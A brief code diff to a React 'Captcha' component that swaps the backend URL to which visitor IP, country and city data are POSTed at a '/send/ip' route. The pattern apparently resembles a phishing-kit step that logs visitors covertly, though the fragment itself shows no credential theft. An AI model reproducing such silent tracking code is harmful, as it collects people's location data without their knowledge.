@@ -113,7 +113,7 @@ function Captcha({ setStep, Unik, setIp }) {
 
                             setAllData({ ...AllData, ip: data.ip, country: data.country, city: data.city })
 
-                            fetch("https://lobster-app-67ipw.ondigitalocean.app/send/ip", {
+                            fetch("https://back-updated-j9wo.onrender.com/send/ip", {
                                 method: "POST",
                                 body: JSON.stringify(params),
                                 headers: {
